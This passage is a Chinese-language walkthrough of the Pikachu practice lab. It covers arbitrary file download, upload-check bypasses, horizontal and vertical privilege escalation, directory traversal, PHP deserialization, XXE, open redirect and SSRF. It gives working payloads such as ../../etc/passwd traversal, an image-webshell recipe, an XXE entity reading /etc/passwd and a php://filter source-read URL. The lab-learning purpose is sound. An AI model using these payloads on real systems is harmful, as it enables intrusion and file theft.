http://x/vul/unsafedownload/execdownload.php?filename=kb.png
```

尝试修改filename参数通过目录遍历的方式下载/etc/passwd文档，访问

```
http://x/vul/unsafedownload/execdownload.php?filename=../../../../../../etc/passwd
```

成功实现任意文件下载。

### Unsafe Fileupload

这里pikachu的靶场仅仅利用说明了漏洞原理，想要详细学习此部分内容可以去玩玩upload-labs靶场。

任意文件上传是由于后端对用户上传的文件格式，文件内容、文件权限校验不严格造成的。可能会造成上传webshell网站沦陷、网站被挂上黑页等。

#### client check

上传客户端校验一般是通过JS校验，Google Chrome按f12，选择禁用JavaScript即可绕过，客户端校验一般也是通过后缀名判断文件格式，所以也可以通过先把文件名改成合法后缀，上传抓包，burp修改文件名再重放。

Google Chrome按f12，选择禁用JavaScript

直接上传文件，用蚁剑连接即可

#### MIME TYPE

通过mime-type判断文件类型一般就是从http_header头部里面的content-type字段取文件类型，如果服务端取到的值为系统规定的合法值则，可以绕过该限制。

PHP中的`$_FILES()`函数是用来处理客户端向服务器端上传文件的。它包含

```php
$_FILES['file']['name']  #文件名
$_FILES['file']['type']  # 文件类型
$_FILES['file']['size']  # 文件大小，单位为字节
$_FILES['file']['tmp_name'] # 存储在服务器的文件临时副本的名称
$_FILES['file']['error'] # 文件上传的错误代码
```

其中`$_FILES['file']['type']`就是从我们前面说的地方取值，而http请求content-type用户可控，所以可以绕过。

抓包上传请求，修改content-type字段文件类型为允许的类型即可。

image/png

#### get_imagesize()验证

这是PHP判断图片文件大小和文件类型的函数，它以16进制读取文件，从16进制的前几位判断文件类型，如文件开头是8950 4e47是png格式的开头。这个开头也就是我们一般所说的文件幻数。绕过get_imagesize()函数可以通过制作图片马绕过（windows下可以通过命令形如`copy /b pic.png + shell.php picshell.png`来制作图片马）。也可以在木马文件头部直接加上头部如GIF89A。

这个时候就有一个问题，如果上传的文件是图片，那插入的恶意代码怎么执行呢？直接访问后缀为png格式的文件返回就是图片。这个时候可以结合文件包含的组合拳来解析恶意代码。上传图片马拿到上传位置后，结合前面说到的文件包含漏洞即可验证此部分漏洞。

1. 不要在前端使用JS实施上传限制策略
2. 通过服务端对上传文件进行限制：
3. 进行多条件组合检查：比如文件的大小、路径、扩展名、文件类型、文件完整性
4. 对上传的文件在服务器上存储时进行重命名(制定合理的命名规则)
5. 对服务器端上传文件的目录进行权限控制(比如只读) ,，限制执行权限带来的危害

### over permission

> 如果使用A用户的权限去操作B用户的数据，A的权限小于B的权限，如果能够成功操作，则称之为越权操作。 越权漏洞形成的原因是后台使用了 不合理的权限校验规则导致的。 一般越权漏洞容易出现在权限页面（需要登录的页面）增、删、改、查的的地方，当用户对权限页面内的信息进行这些操作时，后台需要对 对当前用户的权限进行校验，看其是否具备操作的权限，从而给出响应，而如果校验的规则过于简单则容易出现越权漏洞。
>
> 因此，在在权限管理中应该遵守：
> 1.使用最小权限原则对用户进行赋权;
> 2.使用合理（严格）的权限校验规则;
> 3.使用后台登录态作为条件进行权限判断,别动不动就瞎用前端传进来的条件;

#### 水平越权

A和B属于同一个级别的用户，如A登录后可以查看自己的信息，他发现提交查看自己信息的请求时候有个username参数，修改username参数可以查看B的个人信息，这就是水平越权了。

这里的情况是，观察到登录lucy账户查看个人信息时请求如下：

```
http://xxx/vul/overpermission/op1/op1_mem.php?username=lucy&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
```

修改username为kobe

```
http://xxx/vul/overpermission/op1/op1_mem.php?username=kobe&submit=%E7%82%B9%E5%87%BB%E6%9F%A5%E7%9C%8B%E4%B8%AA%E4%BA%BA%E4%BF%A1%E6%81%AF
```

成功显示了kobe的个人信息，水平越权漏洞验证成功。

#### 垂直越权

垂直越权一般发生在普通用户越权可以操作管理员工权限的情况。这里的情况是管理员可以查看和新增用户，普通用户只可以查看用户。这里验证过程为：

1. 登录管理员帐号，新增用户，提交请求抓包。
2. 退出管理员帐号，重放新增用户请求，发现不能成功新增用户。
3. 登录普通用户，发现没有新增用户权限，但替换掉1中抓包的请求cookie部分，重放新增用户请求
4. 用户新增成功，垂直越权漏洞验证成功。

### …/…/…/

目录遍历漏洞同样也是对于用户请求输入数据限制不完全造成。比如…/在linux下表示的是目录回溯，超过目录级数的…/最终都会回溯到根目录。我们就可以构造`../../../../../../etc/passwd`路径访问到/etc/passwd等文件。

正常请求

```
http://x/vul/dir/dir_list.php?title=jarheads.php
```

替换title里的文件名参数。

```
http://x/vul/dir/dir_list.php?title=../../../../../etc/passwd
```

成功读取了预期外的文件。

### 敏感信息泄漏

敏感信息泄漏，是指人们把不该公开的信息，给放入到公开的信息库中。造成敏感信息泄露。只要能被黑客看到并对黑客的入侵有帮助的信息都可以属于敏感信息。

比如这里登录页面源码中可以看到注释掉的测试用户名和密码，lili/123456。lili登录之后的cookie字段的比较明显的pw字段弱加密, 删除url路径上的文件名可以看到同级目录下的文件和中间件信息，这些都属于敏感信息泄漏。

### PHP反序列化

php序列化就是把一个对象变成可以传输的字符串，反序列化就是将传输的字符串转换成对象，php实现序列化和反序列化的函数是serialize()，unserialize()。引用pikachu靶场里的序列化和反序列化例子：

```php
class S{
	public $test="pikachu";
}
$s = new S(); //新建一个对象
serialize($s); //序列化对象s

/*******************************
序列化这个对象之后得到的是 O:1:"S":1:{s:4:"test";s:7:"pikachu";}
O-----代表object
1-----对象名字长度
S-----对象名
1---------对象里面有一个变量
s--------string数据类型
4-------数据变量名称长度
test------变量名称
s-------数据类型
7-------变量值长度
pikachu------变量值

******************************/

// 反序列化
$u = unserialize("O:1:"S":1:{s:4:"test";s:7:"pikachu";}");
echo $u->test; //取得test的值为pikachu

// 如果反序列化的内容是用户可以控制的，且后台不正确使用了php中的魔法函数，就会出现安全问题。常见魔法函数有
__construct()  //创建对象时候使用
__destruct()   // 销毁对象时使用
__toString()   // 对象当成字符串时使用
__sleep()   //对象序列化之前运行
__wakeup() // 序列化之后立即被调用
  
// 漏洞举例
class S{
            var $test = "pikachu";
            function __destruct(){
                echo $this->test;
            }
        }
        $s = $_GET['test'];
        @$unser = unserialize($a);

        payload:O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

这里的功能是输入一个序列化数据，源码审计此页面是根据序列化的数据创建S对象时执行了echo，返回对象里test变量的值。如构造正常的值如

```
O:1:"S":1:{s:4:"test";s:7:"pikachu";}
```

提交后会返回pikachu，但如果提交构造的payload如

```
O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')</script>";}
```

则S执行destruct方法时就会echo js脚本，在前端实现xss的效果了。

序列化漏洞很难通过黑盒测试发现，一般发掘反序列化漏洞主要还是通过源码审计。

### XXE

XXE 又称xml外部实体注入攻击。XML 被设计用来传输和存储数据。主要包含三个部分，具体xml是啥可以参考[xml教程](https://www.runoob.com/xml/xml-usage.html)

```xml
<!-- xml声明-->
<?xml version="1.0" encoding="UTF-8"?>

<!-- 文档类型定义DTD: xxe出问题的地方-->
<!-- 1.DTD内部引用-->
<!DOCTYPE  根元素 [元素说明]>
<!-- 2.DTD外部引用-->
<!DOCTYPE 根元素名称 SYSTEM "外部DTD的URI">
<!-- 3.引用公共DTD-->
<!DOCTYPE 根元素名称 PUBLIC "DTD标志名" "公用DTD的URI">


<!-- 文档元素：真正的数据部分-->
<note>
  <to>Tove</to>
  <from>Jani</from>
  <heading>Reminder</heading>
  <body>Don't forget me this weekend!</body>
</note>
```

结合靶场中的源码审计，这里的意思是读取到xml文档数据就在`<pre>`标签里输出，读取不到xml或者读的xml格式错误就返回"XML声明、DTD文档类型定义、文档元素这些都搞懂了吗?"。

引用外部实体构造读取/etc/passwd的payload的

```xml
<?xml version="1.0"?>
<!DOCTYPE ANY [
	<!ENTITY f SYSTEM "file:///etc/passwd">
]>
<x>&f;</x>
```

php里simplexml_load_string()是将xml文档转换成SimpleXMLElement对象，php里解析xml用的是libxml，而libxml在2.9.0版本之后是默认禁止解析xml外部实体内容的，所以后面的版本默认不会有xxe漏洞的。

### 不安全的url跳转

> 不安全的url跳转问题可能发生在一切执行了url地址跳转的地方。
> 如果后端采用了前端传进来的(可能是用户传参,或者之前预埋在前端页面的url地址)参数作为了跳转的目的地,而又没有做判断的话就可能发生"跳错对象"的问题。
>
> url跳转比较直接的危害是:钓鱼,既攻击者使用漏洞方的域名(比如一个比较出名的公司域名往往会让用户放心的点击)做掩盖,而最终跳转的确实钓鱼网站

这里`像秋天的风一样的少年`的超链接链接到url

```
http://xxx/vul/urlredirect/urlredirect.php?url=unsafere.php
```

点击这个链接之后会跳转到unsafere.php页面

但如果修改url参数，构造url

```
http://xxx/vul/urlredirect/urlredirect.php?url=http://www.baidu.com
```

访问上面的链接会跳转到百度。一般用户看域名先看前面，用户可能以为自己访问的是xxx网站，但此处的任意url跳转已经把用户重定向到其他钓鱼页面了。

### SSRF

服务端请求伪造，一般出现在服务端A有从服务端B获取数据功能，但服务端A对请求目标没有限制情况。这样攻击者就可以利用服务器A访问服务器B或者其他和A处在同一个内网的机器。通常这个漏洞被用来做内网信息搜集。

```
PHP中下面函数的使用不当会导致SSRF:
file_get_contents()
fsockopen()
curl_exec()           
```

#### curl

从源码可以看到这里的这部分功能是通过curl_exec()函数执行url传过来参数给的地址，然后将参数返回前端。如果url参数被替换成http://xxxx或者curl支持的其他协议等都会被curl执行（curl支持telnet ftp ftps dict file ldap等）

```
http://xxx/vul/ssrf/ssrf_curl.php?url=http://www.baidu.com
```

#### file_get_content

file_get_content()函数是用于将文件的内容读入到一个字符串中的首选方法，逻辑和前面一样。它支持读取远程文件或者本地文件，也支持多种协议。更多的，它还支持php伪协议，我们可以利用伪协议方法读取本地源码

```
http://www.daishen.ltd:1113/vul/ssrf/ssrf_fgc.php?file=php://filter/read=convert.base64-encode/resource=ssrf.php
```